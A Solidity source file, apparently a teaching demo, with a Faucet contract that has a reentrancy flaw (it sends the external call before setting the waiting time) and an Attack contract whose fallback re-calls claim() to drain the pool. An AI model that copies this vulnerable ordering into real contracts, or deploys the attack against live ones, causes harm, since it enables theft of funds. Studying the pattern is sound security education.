// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

contract Faucet {
    uint256 public pool = 10;
    mapping(address => uint256) public balances;
    mapping(address => uint256) public WaitingTime;

    function claim() public {
        require(
            block.timestamp > WaitingTime[msg.sender],
            "Waiting Time not expired"
        );
        balances[msg.sender]++;
        pool--;

        (bool success, ) = msg.sender.call("");
        require(success, "Failed to send Funds");

        WaitingTime[msg.sender] = block.timestamp + 1 days;
    }

    function nextFaucetRound() external view returns (uint256) {
        return block.timestamp >= WaitingTime[msg.sender] ? 0 : WaitingTime[msg.sender] - block.timestamp;
    }
}

contract Attack {
    Faucet public faucet;

    constructor(address _addr) {
        faucet = Faucet(_addr);
    }

    fallback() external {
        if (faucet.pool() > 0) {
        faucet.claim();
        }
    }

    function attack() external payable {
        require(faucet.pool() > 0);
        faucet.claim();
    }
}
